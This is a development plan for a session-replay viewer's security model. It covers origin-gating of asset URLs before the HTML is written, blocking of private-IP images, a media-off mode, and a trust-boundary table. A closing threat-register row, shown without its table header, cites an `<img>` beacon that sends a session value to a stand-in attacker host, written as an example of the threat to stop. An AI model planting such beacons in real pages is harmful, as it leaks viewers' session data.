<objective>
Establish the viewer-side-fetch security model (MSEC-01 fail-closed origin policy; MSEC-02
mediaMode) and pin the displayed variant viewer-side (ASST-03) so that, after this plan, a
developer can point the viewer at a snapshot mixing a public-CDN image and a
private/internal-IP image and SEE: the public image renders, the internal-IP image is replaced
by a dimensioned placeholder (no GET fired), `mediaMode:'off'` suppresses all asset fetch, and a
responsive image loads the origin's pinned `currentSrc` rather than re-negotiating. Vertical
slice: the renderer fetch gate works end-to-end across snapshot + diff paths in one `npm test`,
with the sandbox/CSP invariants held.

Purpose: v2.0 changes the viewer's verb from render-inert to FETCH; static images are already a
viewer-fetch surface, so the origin policy + mediaMode land here. The single non-negotiable
timing rule (PITFALLS.md Pitfall 1): snapshot asset URLs must be gated PRE-srcdoc at the string
layer, because a real browser's parser fetches `<img src>` during parse, before the post-parse
`load` scrub runs. This is NOT mXSS — we rewrite typed values we are about to emit, not re-parse
scrubbed HTML.
Output: a pure Phase-15-reusable origin classifier, the mediaMode/hook/allowlist config, the
gateAssetUrl orchestrator wired at all four renderer write sites (string-layer snapshot + diff
ADD/ATTR + subtree), the currentSrc pin + srcset neutralization, and the SECURITY.md update.
</objective>

## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| wire → viewer DOM write | Attacker-influenced asset URLs are about to be written into the mirror; the gate runs PRE-write |
| viewer → external network | The viewer's browser fetches asset bytes from arbitrary origins on the viewer's (possibly privileged) network |
| viewer iframe sandbox | The mirror renders attacker HTML; sandbox must stay allow-same-origin only |

Blocked → dimensioned placeholder, the viewer's browser never issues the GET. Tasks 1+2. |
| T-12-07 | Information Disclosure (tracking-pixel / live-viewer confirmation) | renderer asset write | mitigate (HIGH) | Same pre-write origin gate stops `<img src=https://attacker/track?session=...>` beacons for blocked origins; `mediaMode:'off'`/`'poster'` is the escape hatch for security-sensitive hosts (no full-asset fetch surface).
